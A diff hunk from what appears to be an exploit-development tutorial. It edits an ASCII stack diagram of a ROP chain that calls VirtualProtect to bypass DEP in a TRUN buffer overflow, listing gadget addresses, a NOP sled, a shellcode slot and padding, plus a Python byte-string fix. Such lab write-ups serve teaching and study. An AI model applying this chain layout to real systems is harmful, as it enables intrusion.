@@ -192,63 +192,63 @@ def create_rop_chain():
 ```
       * *Note*: We will need to modify the *return ''.join(struct.pack('<I', _) for _ in rop_gadgets)* above to be *return b''.join(struct.pack('<I', _) for _ in rop_gadgets)* as without converting it to a byte string with *b*, we will receive errors!
 
-When *create_rop_chain()* runs, it fills up the stack as follows. Registers shown on the left indicate at which gadget a register is set.
+When *create_rop_chain()* runs, it fills up the stack as follows starting *ROP chain start*. Registers shown on the left indicate at which gadget a register is set.
 
 ```  
-          |              |
-          |     SHELL    |
-          ---------------
-          |  0x90909090  |
-                ...
-          |  0x90909090  |
-          ----------------
-          |              | PUSHAD # RETN
-          ----------------   
-          | 0x90909090   | 
-          ----------------   
-EAX       |              | POP EAX # RETN
-          ----------------   
-          | 0x76f077c7   | RETN (ROP NOP)
-          ----------------   
-EDI       |              | POP EDI # RETN
-          ----------------   
-ECX       | 0x62504802   | &Writable location
-          ----------------   
-          |              | POP ECX # RETN
-          ----------------   
-EDX       |              | XCHG EAX,EDX # RETN
-          ----------------   
-          |              | NEG EAX # RETN
-          ----------------   
-          | 0xffffffc0   | 
-          ----------------   
-          |              | POP EAX # RETN
-          ----------------   
-EBX       |              | XCHG EAX,EBX # RETN
-          ----------------   
-          |              | NEG EAX # RETN
-          ----------------   
-          | 0xfffffdff   |
-          ----------------   
-          |              | POP EAX # RETN
-          ----------------   
-          | 0x766e77c5   | & push esp # ret
-          ----------------   
-EBP       |              | POP EBP # RETN
-          ----------------   
-ESI       |              | MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN
-          ----------------   
-          | 0x76796164   | ptr to &VirtualProtect()    
-          ----------------   
-          |              | POP EBX # RETN
-          ----------------   
-          | ret addr     | -> retn
-          ---------------- 
-          | Padding      |
-          |    ...       |
-          | Padding      |
-          | TRUN /.:/    |
-          ----------------
+             |              |
+             |     SHELL    |
+             ---------------
+             |  0x90909090  |
+             |      ...     |
+             |  0x90909090  |
+             ----------------
+             |              | PUSHAD # RETN
+             ----------------   
+             | 0x90909090   | 
+             ----------------   
+EAX          |              | POP EAX # RETN
+             ----------------   
+             | 0x76f077c7   | RETN (ROP NOP)
+             ----------------   
+EDI          |              | POP EDI # RETN
+             ----------------   
+ECX          | 0x62504802   | &Writable location
+             ----------------   
+             |              | POP ECX # RETN
+             ----------------   
+EDX          |              | XCHG EAX,EDX # RETN
+             ----------------   
+             |              | NEG EAX # RETN
+             ----------------   
+             | 0xffffffc0   | 
+             ----------------   
+             |              | POP EAX # RETN
+             ----------------   
+EBX          |              | XCHG EAX,EBX # RETN
+             ----------------   
+             |              | NEG EAX # RETN
+             ----------------   
+             | 0xfffffdff   |
+             ----------------   
+             |              | POP EAX # RETN
+             ----------------   
+             | 0x766e77c5   | & push esp # ret
+             ----------------   
+EBP          |              | POP EBP # RETN
+             ----------------   
+ESI          |              | MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN
+             ----------------   
+             | 0x76796164   | ptr to &VirtualProtect()    
+             ----------------   
+ROP chain    |              | POP EBX # RETN
+start        ----------------   
+             | retn addr    | overwritten ret addrss of vulnerable function
+             ---------------- 
+             | Padding      |
+             |    ...       |
+             | Padding      |
+             | TRUN /.:/    |
+             ----------------
 ```
 Note: & means address of
 
